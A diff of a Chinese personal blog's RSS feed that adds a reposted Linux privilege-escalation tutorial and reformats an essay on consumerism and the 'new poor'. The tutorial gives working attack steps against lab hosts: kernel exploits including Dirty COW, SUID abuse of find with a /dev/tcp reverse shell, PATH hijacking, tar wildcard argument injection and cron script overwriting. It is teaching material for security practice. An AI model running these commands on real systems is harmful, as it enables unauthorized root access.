@@ -1,33 +1,160 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>huy4ng&#39;s Blog</title>
-    <link>https://huy4ng.github.io/</link>
-    <description>Recent content on huy4ng&#39;s Blog</description>
+    <title>一钩淡月天如水</title>
+    <link>http://huy4ng.github.com/</link>
+    <description>Recent content on 一钩淡月天如水</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Fri, 17 Dec 2021 22:45:41 +0800</lastBuildDate><atom:link href="https://huy4ng.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <language>zh-cn</language>
+    <copyright>huy4ng</copyright>
+    <lastBuildDate>Sun, 19 Dec 2021 00:58:13 +0800</lastBuildDate>
+    
+        <atom:link href="http://huy4ng.github.com/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Linux提权方法整理</title>
+      <link>http://huy4ng.github.com/post/linux%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</link>
+      <pubDate>Sun, 19 Dec 2021 00:58:13 +0800</pubDate>
+      
+      <guid>http://huy4ng.github.com/post/linux%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/</guid>
+      
+        <description>&lt;h1 id=&#34;内核提权&#34;&gt;内核提权&lt;/h1&gt;
+&lt;h2 id=&#34;常规内核提权&#34;&gt;常规内核提权&lt;/h2&gt;
+&lt;p&gt;查看Linux版本
+&lt;code&gt;uname -a&lt;/code&gt;
+&lt;img src=&#34;http://huy4ng.github.com/image/WX20211218-234818@2x.png&#34; alt=&#34;image&#34;&gt;
+查找对应内核的exp，并下载C文件进行编译：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;searchsploit ubuntu 4.4.0
+searchsploit -m linux/local/45010.c
+gcc 45010.c -o 45010 #编译
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/2b1f4af9e370843ea23236ba767ffac8.jpg&#34; alt=&#34;image&#34;&gt;
+将编译好的exp上传到目标tmp目录下，赋予执行权限，可以看到执行后变为root权限
+&lt;img src=&#34;http://huy4ng.github.com/image/WX20211219-010501.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;脏牛提权&#34;&gt;脏牛提权&lt;/h2&gt;
+&lt;p&gt;Linux内核的内存子系统在处理写时拷贝（Copy-on-Write)时存在条件竞争漏洞，导致可以破坏私有只读内存映射。一个低权限的本地用户能够利用此漏洞获取其他只读内存映射的写权限，有可能进一步导致提权漏洞&lt;/p&gt;
+&lt;p&gt;影响版本：Linux kernel &amp;gt;= 2.6.22（2007年发行，到2016年10月18日才修复）&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;uname -a  #查看内核版本
+cd CVE-2016-5195-master/
+make   #编译生成可执行文件
+./dcow -s  #执行exp，成功返回root shell
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/8eec913fe8bd26838451ba719c3fe24f.jpg&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;suid提权&#34;&gt;suid提权&lt;/h1&gt;
+&lt;p&gt;suid可以让文件调用者暂时获得文件拥有者的权限，suid提权的思路让普通用户运行root用户所拥有的suid文件，从而达到提权的目的。
+可用于提权的文件列表：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap
+vim
+find
+bash
+more
+less
+nano
+cp
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查找suid文件命令：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find / -user root -perm -4000 -print 2&amp;gt;/dev/null
+find / -perm -u=s -type f 2&amp;gt;/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发现find存在suid:
+&lt;img src=&#34;http://huy4ng.github.com/image/6bb49719873e1b125097ed8665b79bee.jpg&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/5157baab6b0ca7f26364d4548c1a6275.jpg&#34; alt=&#34;image&#34;&gt;
+使用find执行命令whoami发现是root：
+&lt;code&gt;find 1.txt -exec whoami \;&lt;/code&gt;
+&lt;img src=&#34;http://huy4ng.github.com/image/4981fd420b975481c8355e6e01af4639.jpg&#34; alt=&#34;image&#34;&gt;
+使用find执行反弹shell命令（注意加上-p参数，否则反弹回来的可能是低权限用户shell）：
+&lt;code&gt;find 1.txt -exec bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.197.149/4444 0&amp;gt;&amp;amp;1 -p \;&lt;/code&gt;
+&lt;img src=&#34;http://huy4ng.github.com/image/ac14d660e49fd76041585502e5b1f462.jpg&#34; alt=&#34;image&#34;&gt;
+返回kali查看弹回root shell：
+&lt;img src=&#34;http://huy4ng.github.com/image/a5d067b107336644b33614ae5d54dee6.jpg&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;sudo-提权&#34;&gt;sudo 提权&lt;/h1&gt;
+&lt;p&gt;普通用户一般无法使用root用户命令，使用sudo命令可以让普通用户拥有root权限，但是一般都需要输入用户的密码。管理员为了运营方便可能会对sudoer文件进行不合理的配置，使普通用户不需要输入密码就可以使用sudo命令，从而导致权限提升的问题产生。&lt;/p&gt;
+&lt;p&gt;使用sudo需要输入用户密码，例如查看shadow文件：
+&lt;img src=&#34;http://huy4ng.github.com/image/25f94cbaced9948be142bee58f324e22.jpg&#34; alt=&#34;image&#34;&gt;
+管理员为了方便，配置/etc/sudoers文件，在文件中加入：
+&lt;code&gt;ubuntu ALL=(ALL:ALL) NOPASSWD:ALL&lt;/code&gt;
+&lt;img src=&#34;http://huy4ng.github.com/image/e32c6c2eb25863927de14010ec701a5a.jpg&#34; alt=&#34;image&#34;&gt;
+配置完成后，普通用户使用sudo无需输入密码即可执行root命令：
+&lt;img src=&#34;http://huy4ng.github.com/image/b57af0402c0a0b403dc1c5fce2af5282.jpg&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;环境变量提权&#34;&gt;环境变量提权&lt;/h1&gt;
+&lt;p&gt;PATH是Linux和类Unix操作系统中的环境变量，它指定可执行程序的所有bin和sbin存储目录。当用户在终端上运行任何命令时，它会向shell发送请求以在PATH变量中搜索可执行文件来响应用户执行的命令。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo $PATH   #查看环境变量
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/0e5a4f27a73d8758bec0319bb86f0a281.jpg&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gcc demo.c -o demo   #编译
+chomod u+s demo      #赋予suid
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/c1e0c772525956a36685c1d4dfaf1cd5.jpg&#34; alt=&#34;image&#34;&gt;
+执行demo文件即执行cat /etc/shadow命令：
+&lt;img src=&#34;http://huy4ng.github.com/image/4978d34111d22fbea4c0f0bacccc8796.jpg&#34; alt=&#34;image&#34;&gt;
+现在有一个攻击者拿到普通用户权限，首先执行如下命令查找具有suid的文件，发现demo：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find / -perm -u=s -type f 2&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/01eb8693750510f76862090ba9306c75.jpg&#34; alt=&#34;image&#34;&gt;
+普通用户执行demo文件：
+&lt;img src=&#34;http://huy4ng.github.com/image/160c29249d021854047acc05ed56669c.jpg&#34; alt=&#34;image&#34;&gt;
+接下来劫持环境变量进行提权：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cd /tmp
+echo &amp;quot;/bin/bash&amp;quot; &amp;gt; cat   #创建名为cat的文件，内容为/bin/bash
+cat cat
+chmod 777 cat            #赋予777权限
+export PATH=/tmp:$PATH     #将tmp目录添加环境变量
+echo $PATH
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/50875af48fc0b051f1fce234be581e04.jpg&#34; alt=&#34;image&#34;&gt;
+最后执行demo，在执行cat命令时，从环境变量中查找，按查找顺序优先查找/tmp目录，而/tmp目录下的cat内容为/bin/bash，所以执行的命令从cat /etc/shadow就变成了/bin/bash /etc/shadow，从而达到提权的目的。
+&lt;img src=&#34;http://huy4ng.github.com/image/c919f52dcf61270c8a282343ecd5f04a.jpg&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;cronjobs提权&#34;&gt;Cronjobs提权&lt;/h1&gt;
+&lt;h2 id=&#34;通配符提权&#34;&gt;通配符提权&lt;/h2&gt;
+&lt;p&gt;查看定时任务，发现一个以root权限执行的任务test2.sh，查看test2.sh，发现任务的工作为每分钟执行将/home/ubuntu下的所有内容打包为backup.tar.gz并放置在/tmp目录下（通配符*代表目录下的所有文件）。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cat /etc/crontab  #查看定时任务
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/bbe16dbf79c746039e8d5c1b42ce3ac9.jpg&#34; alt=&#34;image&#34;&gt;
+在/home/ubuntu目录下创建三个文件：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo &amp;quot;cp /bin/bash /tmp/bash;chmod +s /tmp/bash&amp;quot; &amp;gt; test.sh
+echo &amp;quot;&amp;quot; &amp;gt; --checkpoint=1    #文件名为--checkpoint=1
+echo &amp;quot;&amp;quot; &amp;gt; &amp;quot;--checkpoint-action=exec=sh test.sh&amp;quot;
+#文件名为--checkpoint-action=exec=sh test.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/a75a4c5396efddad3b4558033145e13d.jpg&#34; alt=&#34;image&#34;&gt;
+当定时任务触发后，使用了通配符*对整个文件夹进行打包，系统真正执行打包时，将目录下的文件一个一个传参给通配符执行打包操作，而在打包–checkpoint=1和–checkpoint-action=exec=sh test.sh时相当于执行如下命令：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh test.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而–checkpoint和–checkpoint-action正好时tar的参数，此处会被当作参数执行而非文件名打包。–checkpoint-action=exec=sh test.sh为执行test.sh文件，test.sh文件内容为复制bash到tmp目录并赋予suid，即可达到提权的目的：
+&lt;img src=&#34;http://huy4ng.github.com/image/3f39ce0bf8195733dc11f15b10341abf.jpg&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/741c4a23c489ca061b0adb4e98cc83b4.jpg&#34; alt=&#34;image&#34;&gt;
+据说相似的命令还有chown、chmod、rsync等。&lt;/p&gt;
+&lt;h2 id=&#34;文件重写提权&#34;&gt;文件重写提权&lt;/h2&gt;
+&lt;p&gt;由于管理员对定时文件权限错误分配而导致普通用户具有写权限，从而达到提权。&lt;/p&gt;
+&lt;p&gt;普通用户查看定时任务，发现datetest.sh为777权限而且为root用户：
+&lt;img src=&#34;http://huy4ng.github.com/image/f6d0eb2ee3bafc641cb1f7fc2158dc9b.jpg&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/7c8558fde4db9a745835e80e81a93dc4.jpg&#34; alt=&#34;image&#34;&gt;
+普通用户可在datetest.sh中写入命令，将bash复制到tmp并赋予suid：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;quot;cp /bin/bash /tmp/bash;chmod +s /tmp/bash&amp;quot; &amp;gt;&amp;gt; /usr/local/bin/datetest.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行获取root权限：
+&lt;img src=&#34;http://huy4ng.github.com/image/cbcdda76bd0e0a36acf496123a4b7f86.jpg&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://huy4ng.github.com/image/6e7b5a24dde5d3b8ffb32a8c470df92d.jpg&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;转自：https://mp.weixin.qq.com/s/N3lMC9pva5SIufevHu7bKA&lt;/p&gt;
+</description>
+      
+    </item>
+    
     <item>
       <title>如何在消费社会当个穷人</title>
-      <link>https://huy4ng.github.io/posts/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%B6%88%E8%B4%B9%E7%A4%BE%E4%BC%9A%E5%BD%93%E4%B8%AA%E7%A9%B7%E4%BA%BA/</link>
+      <link>http://huy4ng.github.com/post/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%B6%88%E8%B4%B9%E7%A4%BE%E4%BC%9A%E5%BD%93%E4%B8%AA%E7%A9%B7%E4%BA%BA/</link>
       <pubDate>Fri, 17 Dec 2021 22:45:41 +0800</pubDate>
       
-      <guid>https://huy4ng.github.io/posts/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%B6%88%E8%B4%B9%E7%A4%BE%E4%BC%9A%E5%BD%93%E4%B8%AA%E7%A9%B7%E4%BA%BA/</guid>
-      <description>今年的“双11”有些不一样：以往年年破记录的狂欢，如今还没开场，就已收到了越来越多消费者的吐槽，不仅“羊毛越来越难薅”，很多人甚至根本提不起兴致去购物。倒是“女子毕业9年抠出两套房”的事冲上了热搜：豆瓣抠组大神王神爱，靠着各种节俭的窍门，已经在南京拥有了两套房子，用她自己的话说，“我已经达到最低档次的财富自由。不是我挣得多，是我花得少。”
-当然，话是这么说，在这个年头要能有两套房，真正的穷人只怕两口子9年不吃不喝也做不到，很多人花得已经够少了，再抠也抠不下多少。不过，这并不影响无数人对她惊叹、羡慕乃至膜拜，因为她做到了普通人想做而做不到的事：把节俭进行到底，在变老之前就实现了财务自由。
-人们普遍把这看作是“反消费主义的”，但这其实正说明中国人对“消费主义”的理解相当狭隘，以为它只是指“乱花钱”，尤其偏重消费行为中的非理性、炫耀浪费的一面，但事实上，这位“抠神”的所赖以维生的各种优惠、返利、抽奖恰恰是在消费主义社会才有可能，而且她最终想要达成的目的也正是典型的消费主义理想：实现财务自由，买自己想买的东西，只不过她不是通过多赚钱而是通过克制欲望来做到这一点。
-这个问题可能比一般人所设想的更复杂，因为到了物质极大丰富的后现代社会，消费主义几乎是不可避免的——这意味着，人们通过占有物品来界定自己的身份、形象和风格，所谓“我是我所拥有的”。在那位“抠神”的事例中，虽然她似乎尽可能少地购物，但所作所为却都是为了那两套房，而这房子也正是一种特殊的商品，占有它们使她自我感觉更好，并在这个充满风险的时代里提供了稀缺的安全感。
-社会学家齐格蒙特•鲍曼在三十多年前就已预见到，随着西方发达国家从“生产型社会”过渡到“消费型社会”，生活在其中的芸芸众生所扮演的社会角色也将发生微妙而重大的变化。以往人们看重的是某种工作伦理：即便工作没给你带来自己所预期的，你也应当工作，因为工作就是善好，而不工作则是罪恶，给所有人工作也往往被视为解决社会问题的良方；然而，到了“消费型”社会，物质已极大丰富，不仅不愁生产，甚至产能都已经过剩了，问题已颠倒过来——如果不能刺激消费，就没办法继续生产，这就要求合格的社会成员必须具有扮演消费者的能力和意愿。
-正是在这种情况下，“穷人”的内涵也随之发生了变化，就像鲍曼明白指出的，虽然每个时代都有穷人，但“穷人”具体意味着什么，其实取决于与他们同在的“我们”是什么样的人。如果在一个社会中，每个人都通过占有物品来界定自我，那么一个不能或不愿消费的人，就成了一个有缺陷的消费者，一个新穷人——这不仅仅指日常购物，当然也包括人人涌入楼市的时候拒绝买房。
-事情还并不到此为此。这样一个后现代社会势必也是一个充满流动性的社会，因为只有不断消耗，才能源源不断地产出，这就是为什么现在“再循环”变成了当代环保运动的重要主题，因为一个以不断抛弃为特质的社会，势必将制造大量垃圾。如果为了不断消费就得去反复刺激人们的欲望，那么由此召唤出来的魔鬼，可能是我们这个星球所无力承受的，归根结底也是不可持续的。
-与此同时，消费是一种完全个人、独立且终归于孤独的活动，也是所有协调与整合的天敌，这就使得人们很难联合起来，而当人们不能履行消费这一责任的时候，对社会运转而言也就变得多余了。这样，原先那种相互依赖的道德共同体逐渐瓦解，彼此缺乏联系的个体看似有了“选择的权利”，但却被消费主义绑架了——因为“幸福”本身已经与消费能力挂钩了。
-对“新穷人”而言，这种心理上的自我屈辱感才是更为致命的。在消费社会来临之前，无数宗教和传统价值观都赞扬贫穷的好处与美德，这使穷人对富人长久享有一种精神优越感，然而到了现在，贫穷却意味着被排除在日常生活之外，对很多人来说，这都意味着自尊心的降低和难以克服的羞耻感，甚至即便人们意识到自己的困境，也往往仅仅把这看作是一个“没钱”的问题，而无力将之转化为一个公共议题。
-在美国，这已经变成了现实。社会学家马修•戴斯蒙德在研究密尔沃基的房租市场后所写成的《扫地出门》里，揭示了触目惊心的生活状况：缺乏稳定的工作使许多人难以支付生活开销和房租，但付不起房租就会被房东扫地出门，而这样频繁搬家本身又会影响他们找到稳定的工作，于是陷入恶性循环之中。虽然在任何一个社会，贫穷都会影响人们运用自身的权利，但在美国这样一个市场化程度尤为彻底的消费社会里，这一点更是毫不遮掩。
-在发达国家进入后现代社会三十多年后，如今中国社会也“一只脚踏进了后现代”，消费主义的迹象也早已随着全球化的浪潮蔓延到了这里，不过，就像在很多发展中国家一样，消费主义对我们来说还有一些微妙而重大的差异，也引发了一些迥然不同的反应。
-从一开始，中国的消费主义就带有浓厚的政治与道德色彩：你可以消费，但最好消费国货，且不得浪费。就像葛凯在《制造中国：消费文化与民族国家的创建》一书中所说的，中国的民族消费主义也“把严厉的限制强加给个人”，国货运动所产生的社会力量“都在重新界定和规范消费主义，直至将消费主义纳入民族意志可以接受的范围”。
-也正因此，1980年代以来的消费主义，虽然至今仍被广泛谴责为道德可疑的挥霍，但对年轻一辈来说，却有一种难得的个体解放感，因为它将他们的自我从道德束缚中释放出来，借用社会学家阎云翔的话说，“这种消费主义使个体欲望的及时满足变成一种个体权利，变成像独立、自由和自我实现等个体主义的其他关键概念一样重要”。
-实际上，国内直到近些年来才开始反思消费主义，但这种反思至今仍大抵仅限于“反对浪费”。问题是：对“需要”和“欲望”的区分主要是一种价值判断，即便是那些我们看作是必需的东西（例如房子），事实上也深受文化渗透，在另一种社会文化中可能完全无法理解为什么中国人如此痴迷于买房，却把去咖啡馆、音乐会和博物馆的文化消费看作是多余的、不必要的乃至是奢侈的。
-从这一意义上说，“抠神”的传说暗示着中国社会的一种全新的心态动向，表明更多年轻人开始自发抑制冲动消费，转而寻求在一个高房价的时代获得心理上的安稳。这仍然是消费主义，因为其背后的意味仍是“它表达我”，只不过现在是用一些不同的物品，来表达一个不同的自我。吊诡的是，这或许正可见中国已转入了消费型社会的下一个阶段，那就是消费主义的重点从物质消费迈向意义消费——通俗地说，就是不再一味“买买买”，而是平时只买需要的，但自己觉得值的，花多少钱都愿意。不仅如此，仅仅占有物品已经不再像以前那样能彰显自我身份，就像《格调》一书所嘲讽的那样，“如今，只有把帽子当作无足轻重的饰物，才能赋予它等级的意味。严肃地看待戴帽一事，只会使自己的身份降低。”
-一个正常的国家不可能没有消费，真正应当做的并不是不分青红皂白地反对消费（那也会造成社会生产的萎缩），而是超越消费主义：客观看待它所带来的好处，反思它所造成的问题，尽可能地不要依靠对物品的占有来建构、表达自我，而是去从事更多的创造性活动，在精神生活中得到满足。做到这些当然不容易，但只要有更多的人愿意这么做，我们这个社会就有可能变得更好一点。</description>
+      <guid>http://huy4ng.github.com/post/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%B6%88%E8%B4%B9%E7%A4%BE%E4%BC%9A%E5%BD%93%E4%B8%AA%E7%A9%B7%E4%BA%BA/</guid>
+      
+        <description>&lt;p&gt;今年的“双11”有些不一样：以往年年破记录的狂欢，如今还没开场，就已收到了越来越多消费者的吐槽，不仅“羊毛越来越难薅”，很多人甚至根本提不起兴致去购物。倒是“女子毕业9年抠出两套房”的事冲上了热搜：豆瓣抠组大神王神爱，靠着各种节俭的窍门，已经在南京拥有了两套房子，用她自己的话说，“我已经达到最低档次的财富自由。不是我挣得多，是我花得少。”&lt;/p&gt;
+&lt;p&gt;当然，话是这么说，在这个年头要能有两套房，真正的穷人只怕两口子9年不吃不喝也做不到，很多人花得已经够少了，再抠也抠不下多少。不过，这并不影响无数人对她惊叹、羡慕乃至膜拜，因为她做到了普通人想做而做不到的事：把节俭进行到底，在变老之前就实现了财务自由。&lt;/p&gt;
+&lt;p&gt;人们普遍把这看作是“反消费主义的”，但这其实正说明中国人对“消费主义”的理解相当狭隘，以为它只是指“乱花钱”，尤其偏重消费行为中的非理性、炫耀浪费的一面，但事实上，这位“抠神”的所赖以维生的各种优惠、返利、抽奖恰恰是在消费主义社会才有可能，而且她最终想要达成的目的也正是典型的消费主义理想：实现财务自由，买自己想买的东西，只不过她不是通过多赚钱而是通过克制欲望来做到这一点。&lt;/p&gt;
+&lt;p&gt;这个问题可能比一般人所设想的更复杂，因为到了物质极大丰富的后现代社会，消费主义几乎是不可避免的——这意味着，人们通过占有物品来界定自己的身份、形象和风格，所谓“我是我所拥有的”。在那位“抠神”的事例中，虽然她似乎尽可能少地购物，但所作所为却都是为了那两套房，而这房子也正是一种特殊的商品，占有它们使她自我感觉更好，并在这个充满风险的时代里提供了稀缺的安全感。&lt;/p&gt;
+&lt;p&gt;社会学家齐格蒙特•鲍曼在三十多年前就已预见到，随着西方发达国家从“生产型社会”过渡到“消费型社会”，生活在其中的芸芸众生所扮演的社会角色也将发生微妙而重大的变化。以往人们看重的是某种工作伦理：即便工作没给你带来自己所预期的，你也应当工作，因为工作就是善好，而不工作则是罪恶，给所有人工作也往往被视为解决社会问题的良方；然而，到了“消费型”社会，物质已极大丰富，不仅不愁生产，甚至产能都已经过剩了，问题已颠倒过来——如果不能刺激消费，就没办法继续生产，这就要求合格的社会成员必须具有扮演消费者的能力和意愿。&lt;/p&gt;
+&lt;p&gt;正是在这种情况下，“穷人”的内涵也随之发生了变化，就像鲍曼明白指出的，虽然每个时代都有穷人，但“穷人”具体意味着什么，其实取决于与他们同在的“我们”是什么样的人。如果在一个社会中，每个人都通过占有物品来界定自我，那么一个不能或不愿消费的人，就成了一个有缺陷的消费者，一个新穷人——这不仅仅指日常购物，当然也包括人人涌入楼市的时候拒绝买房。&lt;/p&gt;
+&lt;p&gt;事情还并不到此为此。这样一个后现代社会势必也是一个充满流动性的社会，因为只有不断消耗，才能源源不断地产出，这就是为什么现在“再循环”变成了当代环保运动的重要主题，因为一个以不断抛弃为特质的社会，势必将制造大量垃圾。如果为了不断消费就得去反复刺激人们的欲望，那么由此召唤出来的魔鬼，可能是我们这个星球所无力承受的，归根结底也是不可持续的。&lt;/p&gt;
+&lt;p&gt;与此同时，消费是一种完全个人、独立且终归于孤独的活动，也是所有协调与整合的天敌，这就使得人们很难联合起来，而当人们不能履行消费这一责任的时候，对社会运转而言也就变得多余了。这样，原先那种相互依赖的道德共同体逐渐瓦解，彼此缺乏联系的个体看似有了“选择的权利”，但却被消费主义绑架了——因为“幸福”本身已经与消费能力挂钩了。&lt;/p&gt;
+&lt;p&gt;对“新穷人”而言，这种心理上的自我屈辱感才是更为致命的。在消费社会来临之前，无数宗教和传统价值观都赞扬贫穷的好处与美德，这使穷人对富人长久享有一种精神优越感，然而到了现在，贫穷却意味着被排除在日常生活之外，对很多人来说，这都意味着自尊心的降低和难以克服的羞耻感，甚至即便人们意识到自己的困境，也往往仅仅把这看作是一个“没钱”的问题，而无力将之转化为一个公共议题。&lt;/p&gt;
+&lt;p&gt;在美国，这已经变成了现实。社会学家马修•戴斯蒙德在研究密尔沃基的房租市场后所写成的《扫地出门》里，揭示了触目惊心的生活状况：缺乏稳定的工作使许多人难以支付生活开销和房租，但付不起房租就会被房东扫地出门，而这样频繁搬家本身又会影响他们找到稳定的工作，于是陷入恶性循环之中。虽然在任何一个社会，贫穷都会影响人们运用自身的权利，但在美国这样一个市场化程度尤为彻底的消费社会里，这一点更是毫不遮掩。&lt;/p&gt;
+&lt;p&gt;在发达国家进入后现代社会三十多年后，如今中国社会也“一只脚踏进了后现代”，消费主义的迹象也早已随着全球化的浪潮蔓延到了这里，不过，就像在很多发展中国家一样，消费主义对我们来说还有一些微妙而重大的差异，也引发了一些迥然不同的反应。&lt;/p&gt;
+&lt;p&gt;从一开始，中国的消费主义就带有浓厚的政治与道德色彩：你可以消费，但最好消费国货，且不得浪费。就像葛凯在《制造中国：消费文化与民族国家的创建》一书中所说的，中国的民族消费主义也“把严厉的限制强加给个人”，国货运动所产生的社会力量“都在重新界定和规范消费主义，直至将消费主义纳入民族意志可以接受的范围”。&lt;/p&gt;
+&lt;p&gt;也正因此，1980年代以来的消费主义，虽然至今仍被广泛谴责为道德可疑的挥霍，但对年轻一辈来说，却有一种难得的个体解放感，因为它将他们的自我从道德束缚中释放出来，借用社会学家阎云翔的话说，“这种消费主义使个体欲望的及时满足变成一种个体权利，变成像独立、自由和自我实现等个体主义的其他关键概念一样重要”。&lt;/p&gt;
+&lt;p&gt;实际上，国内直到近些年来才开始反思消费主义，但这种反思至今仍大抵仅限于“反对浪费”。问题是：对“需要”和“欲望”的区分主要是一种价值判断，即便是那些我们看作是必需的东西（例如房子），事实上也深受文化渗透，在另一种社会文化中可能完全无法理解为什么中国人如此痴迷于买房，却把去咖啡馆、音乐会和博物馆的文化消费看作是多余的、不必要的乃至是奢侈的。&lt;/p&gt;
+&lt;p&gt;从这一意义上说，“抠神”的传说暗示着中国社会的一种全新的心态动向，表明更多年轻人开始自发抑制冲动消费，转而寻求在一个高房价的时代获得心理上的安稳。这仍然是消费主义，因为其背后的意味仍是“它表达我”，只不过现在是用一些不同的物品，来表达一个不同的自我。吊诡的是，这或许正可见中国已转入了消费型社会的下一个阶段，那就是消费主义的重点从物质消费迈向意义消费——通俗地说，就是不再一味“买买买”，而是平时只买需要的，但自己觉得值的，花多少钱都愿意。不仅如此，仅仅占有物品已经不再像以前那样能彰显自我身份，就像《格调》一书所嘲讽的那样，“如今，只有把帽子当作无足轻重的饰物，才能赋予它等级的意味。严肃地看待戴帽一事，只会使自己的身份降低。”&lt;/p&gt;
+&lt;p&gt;一个正常的国家不可能没有消费，真正应当做的并不是不分青红皂白地反对消费（那也会造成社会生产的萎缩），而是超越消费主义：客观看待它所带来的好处，反思它所造成的问题，尽可能地不要依靠对物品的占有来建构、表达自我，而是去从事更多的创造性活动，在精神生活中得到满足。做到这些当然不容易，但只要有更多的人愿意这么做，我们这个社会就有可能变得更好一点。&lt;/p&gt;
+</description>
+      
     </item>
     
   </channel>
